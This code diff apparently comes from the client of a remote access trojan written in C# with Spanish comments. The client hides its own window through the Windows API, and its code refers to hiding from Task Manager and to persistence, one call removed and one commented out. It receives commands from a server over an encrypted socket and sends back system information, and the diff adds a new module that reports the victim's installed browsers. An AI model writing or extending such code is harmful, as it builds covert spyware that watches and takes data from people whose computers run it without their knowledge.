@@ -1,15 +1,12 @@
-﻿using System;
-using System.Diagnostics;
+﻿using System.Diagnostics;
 using System.Net.Sockets;
 using System.Security.Cryptography;
 using System.Text;
-using System.Threading.Tasks;
 using Client.Commands;
 using Client.Conexion;
 using Client.Crypto;
-using Client.Native;
 using Client.Util;
-using Microsoft.Extensions.Logging;
+
 
 namespace Client
 {
@@ -17,6 +14,10 @@ namespace Client
     {
         private static  byte[] aesKeyClient;
 
+        [System.Runtime.InteropServices.DllImport("user32.dll")]
+        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+        public const int SW_HIDE = 0;
 
         public static byte[] getAesKey() { return aesKeyClient; }
         static async Task Main(string[] args)
@@ -27,11 +28,10 @@ namespace Client
                 IntPtr hwnd = Process.GetCurrentProcess().MainWindowHandle;
                 if (hwnd != IntPtr.Zero)
                 {
-                    NativeMethods.ShowWindow(hwnd, NativeMethods.SW_HIDE);
+                    ShowWindow(hwnd, SW_HIDE);
                 }
 
-                // Ocultar el proceso del Administrador de Tareas y generar persistencia
-                Functions.HideFromTaskManager();
+                
                 // Functions.AddPersistence();
 
                 // Iniciar la conexión con el servidor
@@ -185,6 +185,11 @@ namespace Client
 
                                     ClientSocket.SendResponse(await SystemInfo.GetSystemInfo(), Channel.SystemInfo);
 
+                                    break;
+
+                                case Channel.BrowserModule:
+                                    string installedBrowsers = Functions.ListInstalledBrowsers();
+                                    ClientSocket.SendResponse(installedBrowsers, Channel.BrowserModule);
                                     break;
 
 
